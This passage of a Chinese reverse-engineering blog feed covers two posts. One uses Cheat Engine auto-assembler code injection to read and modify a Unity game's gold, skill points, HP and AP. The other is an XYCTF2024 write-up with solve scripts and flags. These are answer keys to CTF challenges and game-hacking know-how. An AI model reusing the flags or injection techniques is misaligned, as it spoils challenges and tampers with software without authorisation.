alt="image-20240501233125213"></p><p>详细分析一下这个代码，会发现这里的地址是写死的，以字面量直接放到内容里面，这是为什么呢？</p><p>由于unity是cs语言，cs在编译时只生成il中间代码，在CLR虚拟机中执行，相当于java里面的虚拟机。这样，它边执行边编译，直接把对应的值写死在编译出的代码里面，然后直接执行，这样当然可以每次都使用字面量而每次都可以不一样。</p><p>这也说明不能通过找多级指针来寻找基址，需要另一种方法。</p><p>由于开启了mono分析功能，在检测界面点击：显示反汇编程序：</p><p><img src="https://s2.loli.net/2024/05/01/SDkHMu6Xsi4WBvK.png" alt="image-20240501233819497"></p><p>可以看到已经把函数名翻译出来了，那么我们可以从函数名下文章直接找值，由于函数名是一定的，从函数名开始的偏移也是一定的，这样就可以直接找到对应的变量而不需要找基址。可以看到这里的方法是金币的set方法</p><p>在dnspy中查看</p><p><img src="https://s2.loli.net/2024/05/01/rHcURCS4dVo8nwQ.png" alt="image-20240501234129448"></p><p>显然找get更好</p><p>在ce中ctrl+g跳转:PlayData:get_Gold</p><p>只有1c的长度</p><p><img src="https://s2.loli.net/2024/05/01/9tNqvX15Gkb26Wp.png" alt="image-20240501234429636"></p><p>可以直接从11行取出rax+25c作为gold的值，但是get和set在这里都有rax+25c的偏移，可以怀疑这里有一个结构体，如果可以找到结构体开始的值，相当于整个内容都有了，只不过还有解决每个值对应的内容是什么的问题。这时mono分析功能又派上用场了：</p><p>ctrl+d:</p><p>把我们金钱的地址填进去-结构-定义新的结构：</p><p>它把所有信息显示出来了（还有偏移量）：</p><p><img src="https://s2.loli.net/2024/05/01/yucfLIpWzjeVgK6.png" alt="image-20240501234828639"></p><p>一开始的值就是上面函数中的字面量，soul就是技能点，把这两个偏移记住</p><p>在内存查看中-工具-自动汇编-写自动汇编脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[ENABLE]</span><br><span class="line">&#123;$lua&#125;</span><br><span class="line">if syntaxcheck then return end</span><br><span class="line">if (LaunchMonoDataCollector()==0) then error(&quot;No Mono&quot;) end</span><br><span class="line">;判断mono功能是否开启</span><br><span class="line">&#123;$asm&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">aobscanregion(getGoldMethod,PlayData:get_Gold,PlayData:get_Gold+FF,48 B8)</span><br><span class="line">;取到对应函数对应位的对应值（结构体开始位置）</span><br><span class="line">alloc(Pridata,8)</span><br><span class="line">;生成标签，以标签开头的内容作为标签区域的代码，标签内容是可读可写可执行的</span><br><span class="line">registersymbol(Pridata)</span><br><span class="line">;把标签升为全局变量，可以在其它位置使用，比如制作指针的时候</span><br><span class="line">Pridata:</span><br><span class="line">readmem(getGoldMethod+2,8)</span><br><span class="line">;将对应位置写入全局变量</span><br><span class="line">[DISABLE]</span><br><span class="line">dealloc(Pridata)</span><br><span class="line">unregistersymbol(Pridata)</span><br></pre></td></tr></table></figure><p>这样我们保存后就保存了对应的结构体指针</p><p>然后根据偏移：</p><p><img src="https://s2.loli.net/2024/05/01/pix2qoOGMdzXTIL.png" alt="image-20240501235648619"></p><p>做出指针，后面的soul同理，不再赘述</p><p>在这个结构体中还有人物血量：</p><p>同理把找到的结构体开头作为基址来偏移就好</p><p><img src="https://s2.loli.net/2024/05/01/SOsnpq3f876uJy9.png" alt="image-20240501235927670"></p><p>最后还有cost，每回合费用，它不在这个结构体里面，重新搜索，如法炮制：</p><p>先看结构体偏移8c</p><p>找到setAP函数和getAP函数，这两个函数似乎都没有硬编码的地址，也比较合理，每次开一个战斗都要重新生成一次，但是可以看到：</p><p><img src="https://s2.loli.net/2024/05/02/GAPbXhqDOozjyxf.png" alt="image-20240502000544674"></p><p>明显结构体开头在r15，但是拿不到值，干脆直接注入代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">[Enable]</span><br><span class="line">&#123;$asm&#125;</span><br><span class="line">alloc(newmem,512,BattleTeam:SetAP+11d)</span><br><span class="line">label(returnhere)</span><br><span class="line">label(originalcode)</span><br><span class="line">label(exit)</span><br><span class="line">alloc(Battledata,8)</span><br><span class="line">registersymbol(Battledata);创建全局变量</span><br><span class="line">newmem:;插入获取的代码</span><br><span class="line">mov [Battledata],r15</span><br><span class="line">originalcode:;原来的代码</span><br><span class="line">mov [r15+0000008C],edi</span><br><span class="line"></span><br><span class="line">exit:</span><br><span class="line">jmp returnhere</span><br><span class="line"></span><br><span class="line">BattleTeam:SetAP+11d:;把目标地址改成跳转</span><br><span class="line">jmp newmem</span><br><span class="line">nop 2</span><br><span class="line">returnhere:</span><br><span class="line"></span><br><span class="line">[Disable]</span><br><span class="line">BattleTeam:SetAP+11d:;还原代码</span><br><span class="line">mov [r15+0000008C],edi</span><br><span class="line">dealloc(Battledata)</span><br><span class="line">dealloc(newmem)</span><br><span class="line"></span><br><span class="line">&#123;$asm&#125;</span><br></pre></td></tr></table></figure><p>这样就拿到结构体头了，不过因为是代码注入，必须要调用一次这个函数之后才可以得到值。</p><p>同理就得到AP的值了。</p><hr><h2 id="锁血和秒杀"><a href="#锁血和秒杀" class="headerlink" title="锁血和秒杀"></a>锁血和秒杀</h2><hr><h2 id="角色信物"><a href="#角色信物" class="headerlink" title="角色信物"></a>角色信物</h2><p>这个游戏有一个设定，解锁角色需要一些条件。然后如果想要看后日谈，需要解锁所有角色，然后用对应的礼物给对应的角色3次，并在最后打最终boss的时候带上他们并通关，这需要花费的时间太长了，很离谱，所以准备修改一下。</p><p>在dnspy中搜索角色数据，任意搜索一下，找到了一个用于返回这一个角色数据的函数：</p><p><img src="https://s2.loli.net/2024/05/06/sMQwtbKVmOk93EP.png" alt="image-20240506212320587"></p><p>通过这个查找被什么使用</p><p>找到给礼物的函数：</p><p><img src="https://s2.loli.net/2024/05/06/AkKPJTcZufQoRle.png" alt="image-20240506212840126"></p><p>这个函数表明可以通过charid来查找对应的charData</p>]]></content>
    
    
    <summary type="html">使用CE中的mono分析模块对unity游戏进行分析</summary>
    
    
    
    <category term="实践" scheme="https://www.pri87.vip/categories/%E5%AE%9E%E8%B7%B5/"/>
    
    
    <category term="RE" scheme="https://www.pri87.vip/tags/RE/"/>
    
    <category term="游戏逆向" scheme="https://www.pri87.vip/tags/%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91/"/>
    
    <category term="unity" scheme="https://www.pri87.vip/tags/unity/"/>
    
  </entry>
  
  <entry>
    <title>NSSCTF-r22题目复现</title>
    <link href="https://www.pri87.vip/posts/8a68bf71.html"/>
    <id>https://www.pri87.vip/posts/8a68bf71.html</id>
    <published>2024-04-26T15:35:39.000Z</published>
    <updated>2024-04-28T14:26:59.701Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>XYCTF2024-wp</title>
    <link href="https://www.pri87.vip/posts/685012f7.html"/>
    <id>https://www.pri87.vip/posts/685012f7.html</id>
    <published>2024-04-26T15:28:28.000Z</published>
    <updated>2024-05-02T12:53:54.544Z</updated>
    
    <content type="html"><![CDATA[<p>能说什么呢，这题。。。难以言喻</p><hr><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="week1"><a href="#week1" class="headerlink" title="week1"></a>week1</h3><h4 id="DebugMe"><a href="#DebugMe" class="headerlink" title="DebugMe"></a>DebugMe</h4><p>这个是安卓动态调试，之前遇到过一个类似的，但是不同的是，那个直接在模拟器里面调就可以，这次这个好像没有被jadx识别到。</p><p>然后学到了另外一种方法：</p><p>在jadx调试界面直接点击启动ADB服务，然后打开模拟器，点击刷新，就能看到所有进程，然后就可以调试了</p><p>这个时候点击按钮，出flag</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">XYCTF</span><span class="template-variable">&#123;d3bugg3r_15_v3ry_u53ful&#125;</span></span><br></pre></td></tr></table></figure><h4 id="你真的是大学生吗？"><a href="#你真的是大学生吗？" class="headerlink" title="你真的是大学生吗？"></a>你真的是大学生吗？</h4><p>这个是一个16位dos程序，ida打开看汇编还原程序</p><p>加密逻辑：</p><p><img src="https://s2.loli.net/2024/04/06/OKsLR8WFtHxiI92.png" alt="image-20240406123918332"></p><p>相当于每次和下一位xor</p><p>之前没怎么搞懂mov si ，2F，然后发现是把它当地址。。没看明白add si,cx有什么用，可能add si,cx是创建一个空缓冲区存输入的。</p><p>加密逻辑确实是从最后开始向前异或，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = *p2;</span><br><span class="line">p2-=<span class="number">1</span>;</span><br><span class="line">*p2 ^= a;</span><br></pre></td></tr></table></figure><p>那直接逆向</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> prism <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">a = [<span class="number">0x76</span>, <span class="number">0x0E</span>, <span class="number">0x77</span>, <span class="number">0x14</span>, <span class="number">0x60</span>, <span class="number">0x06</span>, <span class="number">0x7D</span>, <span class="number">0x04</span>, <span class="number">0x6B</span>, <span class="number">0x1E</span>, <span class="number">0x41</span>, <span class="number">0x2A</span>, <span class="number">0x44</span>, <span class="number">0x2B</span>, <span class="number">0x5C</span>, <span class="number">0x03</span>, <span class="number">0x3B</span>, <span class="number">0x0B</span>, <span class="number">0x33</span>, <span class="number">0x05</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">    a[i]^=a[(i+<span class="number">1</span>)%<span class="built_in">len</span>(a)]</span><br><span class="line">pl(a)</span><br><span class="line"><span class="comment"># xyctf&#123;you_know_8086&#125;</span></span><br></pre></td></tr></table></figure><h4 id="喵喵的flag碎了一地"><a href="#喵喵的flag碎了一地" class="headerlink" title="喵喵的flag碎了一地"></a>喵喵的flag碎了一地</h4><p>这个不用多说，直接跟着提示走就好</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;<span class="symbol">My_fl@</span><span class="symbol">g_h4s_br0ken_4parT_Bu7_Y0u_c@</span>n_f1x_1t!&#125;</span><br></pre></td></tr></table></figure><h4 id="聪明的信使"><a href="#聪明的信使" class="headerlink" title="聪明的信使"></a>聪明的信使</h4><p>一眼凯撒加密，拿去爆破</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Y0u_KnOw_Crypt0_14_v3ry_Imp0rt@nt!&#125;</span><br></pre></td></tr></table></figure><p>偏移是9</p><h4 id="Trustme"><a href="#Trustme" class="headerlink" title="Trustme"></a>Trustme</h4><p>解包之后感觉哪里不对，好像什么都没有，但是assets里面有一个mydb的文件，打开看看，全是0xff，异或一下试试，出来了QAQ</p><p>查一下知道这个是SQLite文件，用在线工具分析文件得到flag</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">XYCTF</span><span class="template-variable">&#123;And0r1d_15_V3ryEasy&#125;</span></span><br></pre></td></tr></table></figure><h4 id="Baby-Unity-ez-Unity"><a href="#Baby-Unity-ez-Unity" class="headerlink" title="Baby Unity &#x2F; ez Unity"></a>Baby Unity &#x2F; ez Unity</h4><p>这两个的做法一模一样，唯一的区别是ez里面的dat文件头被修改了，先放flag，然后记录一下第一次遇到li2cpp的题</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">XYCTF</span>&#123;<span class="number">389</span>f6900-e12d-<span class="number">4</span>c54-a85d-<span class="number">64</span>a54af9f84c&#125;</span><br></pre></td></tr></table></figure><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">XYCTF</span><span class="template-variable">&#123;IL2CPP_1s_intere5t1ng&#125;</span></span><br></pre></td></tr></table></figure><p>原理大概是这样：</p><p>unity的游戏输出有两种一种是mono的c#（一般逆的），这种一般在managed文件夹里有Assembly-CShap.dll文件，然后这个东西可以直接被dnspy之类的直接反编译。这次这种叫li2cpp（中间代码 to cpp）,通过失去动态编译特性来换取cpp的多平台，速度快等优势，对逆向来说：最恶心的就是文件变成了GameAssembly.dll，这是个PE文件（在移动端是so文件），也就是说符号表完全不必要有，这样就不好逆了（如果有佬可以直接逆的话，只能说NB），不过这个文件也没有常量表之类的东西所以肯定在一个地方存了它的数据来读入。</p><p>根据检索网络得知：符号表位于\il2cpp_data\Metadata\global-metadata.dat</p><p>现在的目的就是把这个文件导入进去了。</p><p>有一个工具叫做licppdumper可以做到这一点：</p><p>下载后双击exe，提示选择li2cpp二进制文件，选择GameAssembly.dll，又提示选择dat文件选择dat文件（baby那道题可以直接导入，ez那道题做了加密）</p><p>发现导入不了，去010看看结构：</p><p><img src="https://s2.loli.net/2024/04/06/cElIVup7XRNadnD.png" alt="错误的结构"></p><p><img src="https://s2.loli.net/2024/04/06/DjiS8cWGAzyf3U5.png" alt="正常的结构"></p><p>把第一排改成AF 1B B1 FA 1D 00 00 00 00 01 00 00，删几个字符，让后面接着C0 B2</p><p>然后把下面的内容对齐</p><p>直接dumper导入，导入成功！</p><p>然后打开ida，导入脚本文件，然后选择刚刚用dumper生成的两个json文件：</p><p>script.json和stringliteral.json文件，两个选择完之后,符号表就恢复了，然后在ida里面直接找加密函数，应该很好看，一个是RC4，一个是AES直接放到在线网站上解就好了，其中用到的数被还原成注释了，不要看错了QAQ</p><h3 id="week2"><a href="#week2" class="headerlink" title="week2"></a>week2</h3><h4 id="ez-cube"><a href="#ez-cube" class="headerlink" title="ez_cube"></a>ez_cube</h4><p>用ida反编译分析，找到打乱方式</p><p><img src="https://s2.loli.net/2024/04/09/21wu6gCdpSfPxc5.png" alt="image-20240409183514183"></p><p>百度搜索cfop pll可得公式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">R <span class="string">U&#x27; R U R U R U&#x27;</span> <span class="string">R&#x27; U&#x27;</span> R2</span><br><span class="line">flag&#123;RuRURURuruRR&#125;</span><br></pre></td></tr></table></figure><h4 id="ez-rand"><a href="#ez-rand" class="headerlink" title="ez_rand"></a>ez_rand</h4><p>这个题就是考rand函数在不同环境下效果不同这个知识点，刚好我一开始就用的cpp，直接写脚本爆破出rand然后用就好了，还有注意传入初始化的值在al寄存器里面，所以要&amp;0xffff</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;ctime&gt;</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstdlib&gt;</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="type">long</span> tstart = <span class="number">1640966400</span>;</span><br><span class="line">    <span class="type">long</span> tlast = <span class="number">1735660800</span>;</span><br><span class="line">    <span class="type">long</span> time = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> flag[<span class="number">29</span>] = &#123; <span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span> &#125;;<span class="comment">/*&quot;XYCTF&#123;&quot;;*/</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> data[<span class="number">29</span>] = &#123;</span><br><span class="line">    <span class="number">0x5D</span>, <span class="number">0x0C</span>, <span class="number">0x6C</span>, <span class="number">0xEA</span>, <span class="number">0x46</span>, <span class="number">0x19</span>, <span class="number">0xFC</span>, <span class="number">0x34</span>, <span class="number">0xB2</span>, <span class="number">0x62</span>, <span class="number">0x23</span>, <span class="number">0x07</span>, <span class="number">0x62</span>, <span class="number">0x22</span>, <span class="number">0x6E</span>, <span class="number">0xFB</span>,</span><br><span class="line">    <span class="number">0xB4</span>, <span class="number">0xE8</span>, <span class="number">0xF2</span>, <span class="number">0xA9</span>, <span class="number">0x91</span>, <span class="number">0x12</span>, <span class="number">0x21</span>, <span class="number">0x86</span>, <span class="number">0xDB</span>, <span class="number">0x8E</span>, <span class="number">0xE9</span>, <span class="number">0x43</span>, <span class="number">0x4D</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="comment">//for (time = tstart; time &lt;= tlast; time++)</span></span><br><span class="line">    <span class="comment">//&#123;</span></span><br><span class="line">    <span class="comment">//    srand(time &amp; 0xffff);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//    int f = 0;</span></span><br><span class="line">    <span class="comment">//    for (int i = 0; i &lt; 6; i++)</span></span><br><span class="line">    <span class="comment">//    &#123;</span></span><br><span class="line">    <span class="comment">//        int num = rand();</span></span><br><span class="line">    <span class="comment">//        if ((flag[i] ^ (unsigned __int8)(num + ((((unsigned __int64)(2155905153 * num) &gt;&gt; 32) &amp; 0x80000000) != 0) + ((int)((unsigned __int64)(2155905153 * num) &gt;&gt; 32) &gt;&gt; 7))) == data[i])</span></span><br><span class="line">    <span class="comment">//        &#123;</span></span><br><span class="line">    <span class="comment">//            f++;</span></span><br><span class="line">    <span class="comment">//        &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//        if (f &gt;= 6)</span></span><br><span class="line">    <span class="comment">//        &#123;</span></span><br><span class="line">    <span class="comment">//            printf(&quot;%d  &quot;, time &amp; 0xffff);</span></span><br><span class="line">    <span class="comment">//        &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//    &#125;</span></span><br><span class="line">    <span class="comment">//    //std::cout &lt;&lt; std::endl;</span></span><br><span class="line">    <span class="comment">//&#125;</span></span><br><span class="line">    time = <span class="number">21308</span>;</span><br><span class="line">    <span class="built_in">srand</span>(time);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">29</span>; i++) &#123;</span><br><span class="line">        <span class="type">int</span> num = <span class="built_in">rand</span>();</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> x = (<span class="type">unsigned</span> __int8)(num + ((((<span class="type">unsigned</span> __int64)(<span class="number">2155905153</span> * num) &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0x80000000</span>) != <span class="number">0</span>) + ((<span class="type">int</span>)((<span class="type">unsigned</span> __int64)(<span class="number">2155905153</span> * num) &gt;&gt; <span class="number">32</span>) &gt;&gt; <span class="number">7</span>));</span><br><span class="line">        flag[i] = data[i] ^ x;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    std::cout &lt;&lt; flag;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//XYCTF&#123;R@nd_1s_S0_S0_S0_easy!&#125;</span></span><br></pre></td></tr></table></figure><h4 id="今夕是何年"><a href="#今夕是何年" class="headerlink" title="今夕是何年"></a>今夕是何年</h4><p>架构题，是龙芯架构，配好虚拟机，然后直接输出</p><p><img src="https://s2.loli.net/2024/04/09/dmL7viqNCcRYBZI.png" alt="image-20240409185205541"></p><h4 id="何须相思煮余年"><a href="#何须相思煮余年" class="headerlink" title="何须相思煮余年"></a>何须相思煮余年</h4><p>居然是一个txt文件，开头是push ebp，那没事了，直接ida32打开</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> prism <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">enc = [<span class="number">88</span>,<span class="number">88</span>,<span class="number">134</span>,<span class="number">87</span>,<span class="number">74</span>,<span class="number">118</span>,<span class="number">318</span>,<span class="number">101</span>,<span class="number">59</span>,<span class="number">92</span>,<span class="number">480</span>,<span class="number">60</span>,<span class="number">65</span>,<span class="number">41</span>,<span class="number">770</span>,<span class="number">110</span>,<span class="number">73</span>,<span class="number">31</span>,<span class="number">918</span>,<span class="number">39</span>,<span class="number">120</span>,<span class="number">27</span>,<span class="number">1188</span>,<span class="number">47</span>,<span class="number">77</span>,<span class="number">24</span>,<span class="number">1352</span>,<span class="number">44</span>,<span class="number">81</span>,<span class="number">23</span>,<span class="number">1680</span>,<span class="number">46</span>,<span class="number">85</span>,<span class="number">15</span>,<span class="number">1870</span>,<span class="number">66</span>,<span class="number">91</span>,<span class="number">16</span>,<span class="number">4750</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">39</span>):</span><br><span class="line">    <span class="keyword">if</span> (i%<span class="number">4</span>==<span class="number">0</span>):</span><br><span class="line">        enc[i]-=i</span><br><span class="line">    <span class="keyword">if</span>(i%<span class="number">4</span>==<span class="number">1</span>):</span><br><span class="line">        enc[i]+=i</span><br><span class="line">    <span class="keyword">if</span>(i%<span class="number">4</span>==<span class="number">2</span>):</span><br><span class="line">        enc[i]//=i</span><br><span class="line">    <span class="keyword">if</span>(i%<span class="number">4</span>==<span class="number">3</span>):</span><br><span class="line">        enc[i]^=i</span><br><span class="line">pl(enc)</span><br><span class="line"><span class="comment"># XYCTF&#123;5b3e07567a9034d06851475481507a75&#125;</span></span><br></pre></td></tr></table></figure><h4 id="砸核桃"><a href="#砸核桃" class="headerlink" title="砸核桃"></a>砸核桃</h4><p>查一下壳是nspack，直接找个工具脱了</p><p>然后打开。又是很简单的逻辑,直接写脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> prism <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">k = <span class="string">&#x27;this_is_not_flag&#x27;</span></span><br><span class="line"></span><br><span class="line">last = [<span class="number">0x00000012</span>, <span class="number">0x00000004</span>, <span class="number">0x00000008</span>, <span class="number">0x00000014</span>, <span class="number">0x00000024</span>, <span class="number">0x0000005C</span>, <span class="number">0x0000004A</span>, <span class="number">0x0000003D</span>, <span class="number">0x00000056</span>, <span class="number">0x0000000A</span>, <span class="number">0x00000010</span>, <span class="number">0x00000067</span>, <span class="number">0x00000000</span>, <span class="number">0x00000041</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000046</span>, <span class="number">0x0000005A</span>, <span class="number">0x00000044</span>, <span class="number">0x00000042</span>, <span class="number">0x0000006E</span>, <span class="number">0x0000000C</span>, <span class="number">0x00000044</span>, <span class="number">0x00000072</span>, <span class="number">0x0000000C</span>, <span class="number">0x0000000D</span>, <span class="number">0x00000040</span>, <span class="number">0x0000003E</span>, <span class="number">0x0000004B</span>, <span class="number">0x0000005F</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x0000004C</span>, <span class="number">0x0000005E</span>, <span class="number">0x0000005B</span>, <span class="number">0x00000017</span>, <span class="number">0x0000006E</span>, <span class="number">0x0000000C</span>, <span class="number">0x00000016</span>, <span class="number">0x00000068</span>, <span class="number">0x0000005B</span>, <span class="number">0x00000012</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>]</span><br><span class="line"></span><br><span class="line">pxor(last,k)</span><br><span class="line"><span class="comment"># flag&#123;59b8ed8f-af22-11e7-bb4a-3cf862d1ee75&#125;</span></span><br></pre></td></tr></table></figure><h3 id="week3"><a href="#week3" class="headerlink" title="week3"></a>week3</h3><h4 id="ez-enc"><a href="#ez-enc" class="headerlink" title="ez_enc"></a>ez_enc</h4><p>打开main，是一个简单的带mod的加密，既然是前一个数据和后一个数据有关系，还不大，直接z3</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> prism <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">key = <span class="string">&#x27;IMouto&#x27;</span></span><br><span class="line"></span><br><span class="line">last = [<span class="number">0x27</span>, <span class="number">0x24</span>, <span class="number">0x17</span>, <span class="number">0x0B</span>, <span class="number">0x50</span>, <span class="number">0x03</span>, <span class="number">0xC8</span>, <span class="number">0x0C</span>, </span><br><span class="line">        <span class="number">0x1F</span>, <span class="number">0x17</span>, <span class="number">0x36</span>, <span class="number">0x55</span>, <span class="number">0xCB</span>, <span class="number">0x2D</span>, <span class="number">0xE9</span>, <span class="number">0x32</span>, </span><br><span class="line">        <span class="number">0x0E</span>, <span class="number">0x11</span>, <span class="number">0x26</span>, <span class="number">0x02</span>, <span class="number">0x0C</span>, <span class="number">0x07</span>, <span class="number">0xFC</span>, <span class="number">0x27</span>, </span><br><span class="line">        <span class="number">0x3D</span>, <span class="number">0x2D</span>, <span class="number">0xED</span>, <span class="number">0x35</span>, <span class="number">0x59</span>, <span class="number">0xEB</span>, <span class="number">0x3C</span>, <span class="number">0x3E</span>, </span><br><span class="line">        <span class="number">0xE4</span>, <span class="number">0x7D</span>]</span><br><span class="line"></span><br><span class="line">out,flag = zini(<span class="number">34</span>)</span><br><span class="line">f = Solver()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>):</span><br><span class="line">    f.add(last[i]==(<span class="built_in">ord</span>(key[i%<span class="number">6</span>])^out[i+<span class="number">1</span>]+out[i] % <span class="number">20</span>))</span><br><span class="line"></span><br><span class="line">isflag(f,flag)</span><br><span class="line">zcheck(f,flag)</span><br><span class="line"><span class="comment"># flag&#123;!_r3ea11y_w4nt_@_cu7e_s1$ter&#125;</span></span><br></pre></td></tr></table></figure><h4 id="what’s-this"><a href="#what’s-this" class="headerlink" title="what’s 